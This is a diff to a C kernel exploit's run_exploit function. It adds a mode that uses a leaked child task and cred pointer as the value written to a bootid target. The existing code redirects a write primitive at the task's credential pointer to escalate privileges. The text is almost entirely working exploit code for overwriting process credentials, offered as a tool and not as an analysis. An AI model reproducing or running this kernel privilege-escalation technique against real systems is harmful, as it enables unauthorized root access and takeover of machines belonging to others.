@@ -3849,7 +3849,8 @@ int run_exploit(int argc, char **argv) {
     TIMER("pre-WRITE_PROOF drain");
     /* CAPSONLY: late-bind the target to the child's task+0x780 now that
      * the child exists (spawned below) — use the leaked child task */
-    if (env_flag("MODE4_CAPSONLY", 0)) {
+    if (env_flag("MODE4_CAPSONLY", 0) ||
+        env_flag("MODE4_VALUE_CHILD_CRED", 0)) {
       /*
        * CAPSONLY v2 (child-owned page, PFEM10 W6 adaptation): the child
        * sprays its OWN page with the caps-cred (MODE4_CAPS_CHILD in
@@ -3870,10 +3871,18 @@ int run_exploit(int argc, char **argv) {
           g_child_task = (uintptr_t)report[0];
           g_child_cred = (uintptr_t)report[1];
           g_cap_child_pid = cap_child;
-          proof_tgt = g_child_task + TASK_CRED_OFF;
-          pr_info("CAPSONLY v2: child_task=%016zx child_cred=%016zx "
-                  "target=%016zx\n",
-                  g_child_task, g_child_cred, proof_tgt);
+          if (env_flag("MODE4_VALUE_CHILD_CRED", 0)) {
+            /* ISOLATION: child_cred as VALUE, target stays = bootid
+             * (the normal proof_tgt from target resolution). */
+            pr_info("ISOLATION: child_cred=%016zx VALUE for bootid "
+                    "target=%016zx\n",
+                    g_child_cred, proof_tgt);
+          } else {
+            proof_tgt = g_child_task + TASK_CRED_OFF;
+            pr_info("CAPSONLY v2: child_task=%016zx child_cred=%016zx "
+                    "target=%016zx\n",
+                    g_child_task, g_child_cred, proof_tgt);
+          }
         } else {
           pr_error("CAPSONLY: child report failed (task=%llx cred=%llx)\n",
                    (unsigned long long)report[0],
